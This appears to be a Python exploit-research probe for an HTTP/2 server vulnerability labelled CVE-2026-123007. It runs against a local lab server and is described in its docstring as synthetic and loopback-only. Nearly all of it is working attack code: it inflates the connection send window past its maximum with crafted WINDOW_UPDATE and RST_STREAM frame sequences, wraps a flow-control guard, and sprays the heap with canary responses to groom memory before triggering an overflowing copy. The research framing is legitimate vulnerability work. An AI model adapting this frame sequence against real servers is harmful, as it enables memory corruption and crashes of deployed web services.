#!/usr/bin/env python3
"""Stage-A-mechanics GROOMING probe — CVE-2026-123007 lab harness.

SYNTHETIC/mechanics-only label (owner directive #47, standing approval
item 1, 2026-11-20): the worker runs under the LD_PRELOAD store-first
memcpy shim; no stock-build claim may come from this probe.

Identical to xprobe.py (phases A-C pump to send_window = MAX + 32768,
standalone WU across the wrapped guard, mkX0ping gdb force of the ledger
to 2^63 + 2^32, fresh GET at phase X) with one delta class: every
VICTIM-side stream (1, 3, pump 5..69) GETs /canary instead of /blob, so
the heap region the wrapped copy overwrites is sprayed end to end with
identifiable canary records (stream 1 packs the first chunks past the
16 KiB SSL buffer — allocated at first ssl_send, after stream 1's first
chunk; the pump extends the spray past the stored extent). The phase-X
stream (71) stays on /blob, so the wrapped copy's SOURCE is still chosen
blob bytes; ledger mechanics are byte-count driven and were observed
marker-identical to the /blob probe (gdb PINGMARK/XFORCE/CHARGE/MECHCALL
lines). Loopback only (127.0.0.1).
"""

import json
import socket
import ssl
import struct
import sys
import time

HOST, PORT = "127.0.0.1", 8443
MAX_WINDOW = 0x7FFFFFFF
W1 = MAX_WINDOW - 65535          # -> connection send_window = MAX (pre-blob)
CHUNK = 65536                    # 8 DATA frames x 8192 charged per fresh stream
CYCLES = 33                      # pump until R = MAX + 32768 (observed)
BIG_WU = 0x7FFFFFFF              # phase C step 2: legal only after underflow
X_SID = 71                       # first stream id after the pump (5..69 used)
FORCED = 0x8000000100000000      # 2^63 + 2^32, set by gdb at the mkX0 marker
SPRAY_SID = 1                    # stream that GETs /canary (the groomer)

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

FT_DATA, FT_HEADERS, FT_SETTINGS, FT_RST = 0, 1, 4, 3
FT_PING, FT_GOAWAY, FT_WU = 6, 7, 8
FLAG_END_STREAM, FLAG_END_HEADERS, FLAG_ACK = 0x1, 0x4, 0x1
RST_CANCEL = 8


def frame(ftype, flags, sid, payload=b""):
    return len(payload).to_bytes(3, "big") + bytes([ftype, flags]) + \
        struct.pack(">I", sid) + payload


def window_update(sid, inc):
    return frame(FT_WU, 0, sid, struct.pack(">I", inc))


def rst(sid, status=RST_CANCEL):
    return frame(FT_RST, 0, sid, struct.pack(">I", status))


def ping(marker):
    assert len(marker) == 8
    return frame(FT_PING, 0, 0, marker)


def headers_block(path):
    return bytes([0x82, 0x87, 0x44, len(path)]) + path.encode() + \
        bytes([0x41, 9]) + b"localhost"


def get(path, sid):
    return frame(FT_HEADERS, FLAG_END_HEADERS | FLAG_END_STREAM, sid,
                 headers_block(path))


def summarize(buf):
    """Count DATA bytes / PONG markers / GOAWAY from a byte slice."""
    data_bytes, pongs, goaway = 0, [], None
    i = 0
    while i + 9 <= len(buf):
        length = int.from_bytes(buf[i:i + 3], "big")
        ftype, flags = buf[i + 3], buf[i + 4]
        sid = int.from_bytes(buf[i + 5:i + 9], "big") & 0x7FFFFFFF
        if i + 9 + length > len(buf):
            break
        if ftype == FT_DATA:
            data_bytes += length
        elif ftype == FT_PING and flags & FLAG_ACK:
            pongs.append(buf[i + 9:i + 9 + length].decode("latin1"))
        elif ftype == FT_GOAWAY and len(buf[i + 9:i + 9 + length]) >= 8 \
                and goaway is None:
            p = buf[i + 9:i + 9 + length]
            goaway = {"last_sid": int.from_bytes(p[0:4], "big") & 0x7FFFFFFF,
                      "error_code": int.from_bytes(p[4:8], "big")}
        i += 9 + length
    return data_bytes, pongs, goaway


def main():
    result = {
        "build": sys.argv[1] if len(sys.argv) > 1 else "?",
        "probe": "xgroom",
        "spray_sid": SPRAY_SID, "spray_path": "/canary",
        "w1": W1, "chunk": CHUNK, "cycles": CYCLES, "big_wu": BIG_WU,
        "x_sid": X_SID, "forced": FORCED,
    }

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8192)
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    tls = ctx.wrap_socket(sock, server_hostname="localhost")

    settings = struct.pack(">HI", 0x4, MAX_WINDOW)   # INITIAL_WINDOW_SIZE
    tls.sendall(PREFACE + frame(FT_SETTINGS, 0, 0, settings)
                + window_update(0, W1) + get("/canary", SPRAY_SID))
    time.sleep(3)                                     # burst blocks socket
    tls.sendall(ping(b"mkA0ping"))                    # A0: MAX - blob_charge

    # ---- phase A: one interleave on stream 3 (mechanism proof) ----
    tls.sendall(get("/canary", 3))
    time.sleep(1.5)                                   # charge 65536
    tls.sendall(ping(b"mkA1ping"))
    tls.sendall(window_update(0, CHUNK))                # refill
    time.sleep(0.5)
    tls.sendall(ping(b"mkA2ping"))
    tls.sendall(rst(3))                               # refund on top of refill
    time.sleep(1.5)
    tls.sendall(ping(b"mkA3ping"))                    # A3: R = A2 + 65536

    # ---- phase B: pump CYCLES interleaves; R crosses MAX at cycle 33 ----
    for i in range(CYCLES):
        sid = 5 + 2 * i
        tls.sendall(get("/canary", sid) + window_update(0, CHUNK) + rst(sid))
        if i % 10 == 9:
            time.sleep(0.3)
    time.sleep(2)
    tls.sendall(ping(b"mkB1ping"))                    # B1: expect MAX + 32768

    # ---- phase C: standalone WU while R > MAX -> guard wrap ----
    tls.sendall(window_update(0, CHUNK))
    time.sleep(1.0)
    tls.sendall(ping(b"mkC1ping"))
    tls.sendall(window_update(0, BIG_WU))             # 2^31-1 must be accepted
    time.sleep(1.0)
    tls.sendall(ping(b"mkC2ping"))                    # C2: post-BIG_WU state

    # ---- phase X: gdb forces h2c->send_window = 2^63 + 2^32 at mkX0 ----
    tls.sendall(ping(b"mkX0ping"))
    time.sleep(1.0)
    tls.sendall(ping(b"mkX1ping"))                    # X1: confirm forced value
    tls.sendall(get("/blob", X_SID))                  # fresh send_chain
    time.sleep(2.0)
    tls.sendall(ping(b"mkX2ping"))                    # X2: after the trigger

    # ---- phase D: drain; watch for ASan/crash/GOAWAY/EOF ----
    tls.settimeout(0.3)
    buf, eof = b"", False
    end = time.time() + 10
    while time.time() < end:
        try:
            chunk = tls.recv(262144)
        except (socket.timeout, TimeoutError):
            continue
        if not chunk:
            eof = True
            break
        buf += chunk
    data_bytes, pongs, goaway = summarize(buf)
    result.update({
        "drain": {"bytes": data_bytes, "raw": len(buf), "eof": eof,
                  "pongs": pongs, "goaway": goaway},
        "markers": ["mkA0ping", "mkA1ping", "mkA2ping", "mkA3ping",
                    "mkB1ping", "mkC1ping", "mkC2ping", "mkX0ping",
                    "mkX1ping", "mkX2ping"],
        "sent_wu_total": W1 + CHUNK * (2 + CYCLES) + BIG_WU,
    })

    tls.close()
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
